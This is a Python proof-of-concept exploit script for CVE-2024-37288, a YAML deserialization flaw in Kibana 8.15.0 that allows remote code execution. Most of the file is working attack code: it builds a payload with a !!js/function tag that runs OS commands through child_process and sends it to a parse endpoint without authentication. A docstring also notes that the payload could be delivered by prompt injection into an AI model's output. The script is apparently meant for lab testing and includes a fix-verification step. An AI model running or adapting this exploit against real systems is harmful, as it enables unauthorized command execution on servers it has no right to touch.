#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2024-37288 — Kibana YAML Deserialization RCE (Network)
# Author         : Exploit Intelligence Platform
# Vendor         : Elastic
# Software       : Kibana 8.15.0
# CVE            : CVE-2024-37288
# CWE            : CWE-502 (Deserialization of Untrusted Data)
# CVSS           : 9.9 (CRITICAL)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-37288 — Vector 1: js-yaml Deserialization RCE via HTTP

Demonstrates arbitrary code execution via the unsafe js-yaml v3 load()
function used in Kibana 8.15.0's Integration Assistant plugin. The
DEFAULT_FULL_SCHEMA supports !!js/function YAML tags, which create
executable JavaScript Function objects during YAML parsing.

ATTACK CHAIN:
  1. Craft YAML payload containing a !!js/function tag
  2. Send it to the /api/yaml/parse HTTP endpoint
  3. Server calls yaml.load() — creates a live Function object from the tag
  4. Function executes arbitrary OS commands via child_process
  5. Verify that yaml.safeLoad() correctly rejects the same payload (fix)

PREREQUISITES:
  - Network access to the vulnerable API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2024-37288
  - https://discuss.elastic.co/t/kibana-8-15-1-security-update-esa-2024-27-esa-2024-28/366119

Usage:
    python3 poc.py <target_host> <target_port> [container_name]
    python3 poc.py localhost 8080 cve-2024-37288-vuln-api
"""

import sys
import json
import http.client
import subprocess
import textwrap


MARKER_FILE = "/tmp/cve-2024-37288-poc-proof.txt"


def send_yaml(target_host, target_port, yaml_str, endpoint="/api/yaml/parse"):
    """Send a YAML string to the vulnerable parse endpoint.

    Returns:
        tuple: (status_code, response_dict_or_string)
    """
    body = json.dumps({"yaml": yaml_str})
    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
        conn.request("POST", endpoint, body=body,
                     headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        try:
            return status, json.loads(resp_body)
        except json.JSONDecodeError:
            return status, resp_body
    except Exception as e:
        return None, str(e)


def verify_marker_via_docker(container_name):
    """Verify RCE by checking marker file inside the container (lab convenience)."""
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        return False, result.stderr.strip()
    except Exception as e:
        return False, str(e)


def cleanup_marker(container_name):
    """Remove previous proof artifacts."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def make_rce_yaml(command):
    """Construct a YAML payload with a !!js/function tag that executes a command.

    This payload is structurally identical to what the Nunjucks template in
    createPipeline() would render if an attacker influenced the AI model's
    response via prompt injection in rawSamples.
    """
    return textwrap.dedent(f"""\
        ---
        description: Pipeline to process test_package test_stream logs
        processors:
          - set:
              field: ecs.version
              tag: set_ecs_version
              value: 8.11.0
          - rename:
              field: source_ip
              target_field: !!js/function |
                function() {{
                  return require("child_process").execSync("{command}").toString().trim();
                }}
              ignore_missing: true
        on_failure:
          - append:
              field: error.message
              value: Processor failed
    """)


def exploit(target_host, target_port, container_name):
    """Run the full exploit chain."""
    print("=" * 70)
    print("  CVE-2024-37288 — Kibana js-yaml Deserialization RCE")
    print("  Vector: HTTP POST to /api/yaml/parse (!!js/function)")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Health check
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Step 1: Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()

        if health.get("vulnerable"):
            version = health.get("jsyaml_version", "unknown")
            print(f"[+] Target is UP — js-yaml v{version} with DEFAULT_FULL_SCHEMA")
        else:
            print("[-] Target responded but 'vulnerable' flag not set")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Clean up
    # -----------------------------------------------------------------------
    print("[*] Step 2: Cleaning up previous proof artifacts...")
    cleanup_marker(container_name)

    # -----------------------------------------------------------------------
    # Step 3: Execute commands via !!js/function RCE
    # -----------------------------------------------------------------------
    print("[*] Step 3: Exploiting — RCE via !!js/function deserialization...")
    print()

    commands = ["id", "whoami", "hostname", "head -2 /etc/os-release"]
    all_success = True

    for cmd in commands:
        yaml_payload = make_rce_yaml(cmd)
        print(f"  [*] Executing: {cmd}")

        status, resp = send_yaml(target_host, target_port, yaml_payload)

        if status is None:
            print(f"  [-] Request failed: {resp}")
            all_success = False
            continue

        if isinstance(resp, dict) and resp.get("status") == "dangerous_types_deserialized":
            findings = resp.get("findings", [])
            for f in findings:
                if f.get("type") == "function" and f.get("executed"):
                    print(f"  [+] RCE SUCCESS: {f.get('output', '').strip()}")
                elif f.get("type") == "function":
                    print(f"  [-] Function found but execution error: {f.get('error')}")
        else:
            print(f"  [-] Unexpected response (HTTP {status}): {resp}")
            all_success = False

    # -----------------------------------------------------------------------
    # Step 4: Write marker file (secondary proof)
    # -----------------------------------------------------------------------
    print()
    marker_cmd = f"echo CVE-2024-37288 > {MARKER_FILE} && id >> {MARKER_FILE}"
    yaml_marker = make_rce_yaml(marker_cmd)
    print(f"[*] Step 4: Writing marker file via RCE...")
    status, resp = send_yaml(target_host, target_port, yaml_marker)

    if isinstance(resp, dict) and resp.get("status") == "dangerous_types_deserialized":
        print(f"[+] Marker file write payload sent successfully")
    else:
        print(f"[-] Marker write may have failed: {resp}")

    # Verify marker file
    success, content = verify_marker_via_docker(container_name)
    if success:
        print(f"[+] Marker file verified ({MARKER_FILE}):")
        for line in content.split('\n'):
            print(f"[+]   {line}")

    # -----------------------------------------------------------------------
    # Step 5: Verify fix — safeLoad() rejects the payload
    # -----------------------------------------------------------------------
    print()
    print("[*] Step 5: Verifying fix — safeLoad() should reject !!js/function...")

    yaml_payload = make_rce_yaml("id")
    status, resp = send_yaml(target_host, target_port, yaml_payload,
                             endpoint="/api/yaml/safe-parse")

    if isinstance(resp, dict) and resp.get("status") == "rejected":
        print(f"[+] Fix verified: safeLoad() correctly rejects !!js/function")
        print(f"    Error: {resp.get('error', 'N/A')}")
    elif isinstance(resp, dict) and resp.get("status") == "safe_parsed":
        print(f"[-] WARNING: safeLoad() did NOT reject the payload!")
    else:
        print(f"[?] Unexpected response: {resp}")

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    print()
    print("=" * 70)
    if all_success:
        print("[+] VULNERABILITY CONFIRMED: CVE-2024-37288")
        print("[+] Arbitrary code execution via js-yaml deserialization")
        print("[+] in Kibana 8.15.0 Integration Assistant plugin.")
        print("[+] Fix: Upgrade to Kibana 8.15.1 (load() -> safeLoad())")
    else:
        print("[-] EXPLOITATION INCOMPLETE — some commands failed")
    print("=" * 70)

    return 0 if all_success else 1


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2024-37288-vuln-api"

    sys.exit(exploit(target, port, container))
